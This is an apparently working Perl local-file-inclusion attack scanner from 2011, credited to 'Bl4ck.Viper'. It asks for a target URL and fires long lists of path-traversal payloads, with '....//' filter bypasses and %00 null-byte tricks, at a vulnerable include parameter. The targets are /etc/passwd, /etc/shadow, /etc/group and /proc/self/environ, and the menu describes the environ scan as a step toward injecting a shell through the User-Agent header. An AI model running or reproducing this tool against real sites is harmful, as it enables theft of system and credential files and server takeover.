#!/usr/bin/perl
#
#				////////////////////////////////////
#					Viper LFI Scanner Ver. 4.0
#				////////////////////////////////////
#
#	Title : Viper Lfi Scanner Ver. 4.0
#	Author: Bl4ck.Viper
#	From : Azarbycan
#	Date : 2011/07/06
#	Category : Scanner
#	Home : www.Skote-vahshat.com
#	Emails : Bl4ck.Viper@Yahoo.com , Bl4ck.Viper@Hotmail.com , Bl4ck.Viper@Gmail.com
#	
#
#	Description :Log , Environ , Passwd File Scanner ,& new method for bypass passwd
#					           
#	
#*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*

    use HTTP::Request;
    use LWP::UserAgent;
system ("cls");
print "\t\t/////////////////////////////////////////////////\n";    
print "\t\t_________________________________________________\n";
print "\t\t\t Viper LFI Scanner Ver. 3.0\n";
print "\t\t\t Coded By Bl4ck.Viper\n";
print "\t\t\t Made In Azarbycan\n";
print "\t\t\t Version In English\n";
print "\t\t_________________________________________________\n";
print "\n\n";
sleep (1);
print "\t\t\t\t WELCOME\n";
print "\n\n";
menu:;
print "\tMenu:\n";
print "\t ID[1]=>Passwd,Log";
print "\t[Scan Files Of /etc/ Directory]\n";
print "\t ID[2]=>Environ";
print "\t\t[Scan Environ File For Inject Shell By U-Agent]\n";
print"\n";
print "\t\t Select ID For Start Scanner :";
$menu = <>;
if ($menu =~ /1/){
	goto lfi;
	}
	if ($menu =~ /2/){
		goto env;
	}
	else {
		print"\n\n";
		print "\t\tUnknow Command\n";
		goto menu;
	};


lfi:;
    print "\n\n";
    print "\t\t\tWelcome To /etc/ Section With New Method\n\n";
    print "\t Insert Target (ex: http://www.site.com/index.php?page=)\n";
    print "\t Target :";
    $host=<STDIN>;
    chomp($host);
    if($host !~ /http:\/\//) { $host = "http://$host"; };

print "\n\n";
print "\t\t*-*-*-*-*-* WORKING IN PROGRESS *-*-*-*-*-*\n";
print "\n\n";
@lfi = ('../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../etc/passwd',
'....//etc/passwd',
'....//....//etc/passwd',
'....//....//....//etc/passwd',
'....//....//....//....//etc/passwd',
'....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//etc/passwd',
'....//....//....//....//....//....//....//....//....//....//etc/passwd',
'../../etc/passwd%00',
'../../../etc/passwd%00',
'../../../../etc/passwd%00',
'../../../../../etc/passwd%00',
'../../../../../../etc/passwd%00',
'../../../../../../../etc/passwd%00',
'../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../../etc/passwd%00',
'....//etc/passwd%00',
'....//....//etc/passwd%00',
'....//....//....//etc/passwd%00',
'....//....//....//....//etc/passwd%00',
'....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//etc/passwd%00',
'....//....//....//....//....//....//....//....//....//....//etc/passwd%00',
'../etc/shadow',
'../../etc/shadow',
'../../../etc/shadow',
'../../../../etc/shadow',
'../../../../../etc/shadow',
'../../../../../../etc/shadow',
'../../../../../../../etc/shadow',
'../../../../../../../../etc/shadow',
'../../../../../../../../../etc/shadow',
'../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../../etc/shadow',
'../etc/shadow%00',
'../../etc/shadow%00',
'../../../etc/shadow%00',
'../../../../etc/shadow%00',
'../../../../../etc/shadow%00',
'../../../../../../etc/shadow%00',
'../../../../../../../etc/shadow%00',
'../../../../../../../../etc/shadow%00',
'../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../etc/shadow%00',
'../../../../../../../../../../../../../../etc/shadow%00',
'../etc/group',
'../../etc/group',
'../../../etc/group',
'../../../../etc/group',
'../../../../../etc/group',
'../../../../../../etc/group',
'../../../../../../../etc/group',
'../../../../../../../../etc/group',
'../../../../../../../../../etc/group',
'../../../../../../../../../../etc/group',
'../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../../etc/group',
'../etc/group%00',
'../../etc/group%00',
'../../../etc/group%00',
'../../../../etc/group%00',
'../../../../../etc/group%00',
'../../../../../../etc/group%00',
'../../../../../../../etc/group%00',
'../../../../../../../../etc/group%00',
'../../../../../../../../../etc/group%00',
'../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../etc/group%00',
'../../../../../../../../../../../../../../etc/group%00',
'../etc/security/group',
'../../etc/security/group',
'../../../etc/security/group',
'../../../../etc/security/group',
'../../../../../etc/security/group',
'../../../../../../etc/security/group',
'../../../../../../../etc/security/group',
'../../../../../../../../etc/security/group',
'../../../../../../../../../etc/security/group',
'../../../../../../../../../../etc/security/group',
'../../../../../../../../../../../etc/security/group',
'../etc/security/group%00',
'../../etc/security/group%00',
'../../../etc/security/group%00',
'../../../../etc/security/group%00',
'../../../../../etc/security/group%00',
'../../../../../../etc/security/group%00',
'../../../../../../../etc/security/group%00',
'../../../../../../../../etc/security/group%00',
'../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../etc/security/group%00',
'../../../../../../../../../../../etc/security/group%00',
'../etc/security/passwd',
'../../etc/security/passwd',
'../../../etc/security/passwd',
'../../../../etc/security/passwd',
'../../../../../etc/security/passwd',
'../../../../../../etc/security/passwd',
'../../../../../../../etc/security/passwd',
'../../../../../../../../etc/security/passwd',
'../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../../etc/security/passwd',
'../etc/security/passwd%00',
'../../etc/security/passwd%00',
'../../../etc/security/passwd%00',
'../../../../etc/security/passwd%00',
'../../../../../etc/security/passwd%00',
'../../../../../../etc/security/passwd%00',
'../../../../../../../etc/security/passwd%00',
'../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../../etc/security/passwd%00',
'../etc/security/user',
'../../etc/security/user',
'../../../etc/security/user',
'../../../../etc/security/user',
'../../../../../etc/security/user',
'../../../../../../etc/security/user',
'../../../../../../../etc/security/user',
'../../../../../../../../etc/security/user',
'../../../../../../../../../etc/security/user',
'../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../../etc/security/user',
'../etc/security/user%00',
'../../etc/security/user%00',
'../../../etc/security/user%00',
'../../../../etc/security/user%00',
'../../../../../etc/security/user%00',
'../../../../../../etc/security/user%00',
'../../../../../../../etc/security/user%00',
'../../../../../../../../etc/security/user%00',
'../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../etc/security/user%00',
'../../../../../../../../../../../../../etc/security/user%00');


foreach $scan(@lfi){

$url = $host.$scan;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($request);
if ($response->is_success && $response->content =~ /root:x:/) { $msg = Vulnerability;}
else { $msg = "Not Found";}
print "$scan..........[$msg]\n";
}
env:;
    print "\n\n";
    print "\t\t\tWelcom To Environ Section\n\n";
    print "\t Insert Target (ex: http://www.site.com/index.php?page=)\n";
    print "\t Target :";
    $host=<STDIN>;
    chomp($host);
    if($host !~ /http:\/\//) { $host = "http://$host"; };

print "\n\n";
print "\t\t*-*-*-*-*-* WORKING IN PROGRESS *-*-*-*-*-*\n";
print "\n\n";

@env = ('../proc/self/environ',
'../../proc/self/environ',
'../../../proc/self/environ',
'../../../../proc/self/environ',
'../../../../../proc/self/environ',
'../../../../../../proc/self/environ',
'../../../../../../../proc/self/environ',
'../../../../../../../../proc/self/environ',
'../../../../../../../../../proc/self/environ',
'../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../proc/self/environ',
'../proc/self/environ%00',
'../../proc/self/environ%00',
'../../../proc/self/environ%00',
'../../../../proc/self/environ%00',
'../../../../../proc/self/environ%00',
'../../../../../../proc/self/environ%00',
'../../../../../../../proc/self/environ%00',
'../../../../../../../../proc/self/environ%00',
'../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../proc/self/environ%00');

foreach $scan_env(@env){

$url = $host.$scan_env;
$request = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($request);
if ($response->is_success && $response->content =~ /HTTP_ACCEPT/ && $response->content =~ /HTTP_HOST/) { $msg = Vulnerability;}
else { $msg = "Not Found";}
print "$scan_env..........[$msg]\n";
}


# Bl4ck.Viper Turkish Hacker
# Copyright 2010 Black Viper

